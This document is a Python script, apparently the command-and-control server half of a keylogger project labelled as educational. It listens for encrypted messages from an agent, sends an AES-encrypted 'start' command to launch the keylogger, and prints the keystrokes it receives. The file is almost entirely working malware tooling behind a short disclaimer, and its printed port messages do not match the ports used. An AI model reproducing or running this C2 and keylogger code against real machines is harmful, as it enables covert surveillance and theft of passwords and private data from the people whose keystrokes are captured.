###########################################################################################
#### author: NC
#### date: 08/08/2025
#### Python version: 3.8
####
#### ⚠️ DISCLAIMER:#
#### This file is part of a cybersecurity project.
#### It is intended for educational and research purposes only.
#### Must be executed in a controlled environment (e.g., sandbox or VM).
#### Any misuse of this code is strictly prohibited. The author declines any responsibility.
############################################################################################



from Crypto.Cipher import AES

import socket
import os
import sys
import threading
import time



host_server = "127.0.0.1"   # adapt for your lab
host_agent = "127.0.0.1" # adapt for your lab
port_agent_to_server = 4445         # Adapt for your lab
port_server_to_agent = 4447         # Adapt for your lab
key = b"Sixteen byte key"



def encrypt(data, key, iv):
    """
    This function encrypt data with AES
    """

    data += " " * (16 - len(data) % 16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(bytes(data, "utf-8"))



def decrypt(data, key, iv):
    """
    This function decrypt data encrypted by AES
    """

    cipher = AES.new(key, AES.MODE_CBC, iv) 
    return cipher.decrypt(data)



def receive_from_c2_client():
    """
    This function receive encrypted informations from the agent.
    """

    print(f"[*] Listenning on {host_server}:{port_server_to_agent}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as receive:
        receive.bind((host_server, port_agent_to_server)) 
        receive.listen()

        while True: 
            conn, addr = receive.accept()

            with conn:
                while True:
                    iv = conn.recv(16)
                    length = conn.recv(1)
                    data = conn.recv(1024)

                    if not data:
                        handler_thread = threading.Thread(target=send_to_c2_client)
                        handler_thread.daemon = True
                        handler_thread.start()
                        break
                    
                    elif decrypt(data, key, iv).decode("utf-8")[:ord(length)] == "Connection...":
                        print("Received: %s" % decrypt(data, key, iv).decode("utf-8")[:ord(length)])
                        print("[*] Connection to the c2_client...")
                        handler_thread = threading.Thread(target=send_to_c2_client)
                        handler_thread.daemon = True
                        handler_thread.start()
                        
                    else:
                        print("Received: %s" % decrypt(data, key, iv).decode("utf-8")[:ord(length)])
                    



def send_to_c2_client():
    """
    This function send encrypted arguments to the agent.
    """

    while True:
        time.sleep(5)
        argument = input(
"""
\nstart: Launch the keylogger 
\n[$]Choose an option: """)
        
        if argument == "start":
            print(f"[*] You choose to {argument} the keylogger at {host_agent}:{port_agent_to_server} ...")

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as send:
                send.connect((host_agent, port_server_to_agent))
                iv = os.urandom(16) 
                send.send(iv)
                send.send(bytes([len(argument)]))
                encrypted = encrypt(argument, key, iv)
                print(f"Sending {encrypted.hex()} at {host_agent}:{port_agent_to_server}")
                send.sendall(encrypted)

            print("[*] Listenning the keystroke: ")
            break

        else:
            print("\n[-] Wrong Output")
            time.sleep(1)



handler_thread = threading.Thread(target=receive_from_c2_client)
handler_thread.daemon = True
handler_thread.start()
 


while True:
    time.sleep(1)   